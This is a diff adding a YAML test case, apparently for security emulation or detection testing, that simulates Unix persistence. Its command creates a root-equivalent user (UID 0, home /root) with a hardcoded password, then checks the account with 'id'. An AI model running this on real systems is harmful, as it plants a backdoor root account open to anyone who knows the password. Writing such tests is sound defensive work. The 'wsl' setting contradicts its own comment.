@@ -1,0 +1,12 @@
+test_case_name: "Unix Persistence: New User with UID 0"
+os_type: "unix"  # Can be 'unix' or 'windows'
+wsl: true  # No need to use WSL for this test
+log_commands: true  # Enable logging of all commands
+test_case:
+  name: "Unix Persistence - New User with UID 0"
+  description: "Test creating a new user with UID 0 for persistence."
+  commands:
+    - name: "Create New User with UID 0"
+      command: "sudo useradd -u 0 -o -g 0 -m -d /root -s /bin/bash newuser && echo 'newuser:newpassword' | sudo chpasswd"
+    - name: "Verify New User with UID 0"
+      command: "id newuser"
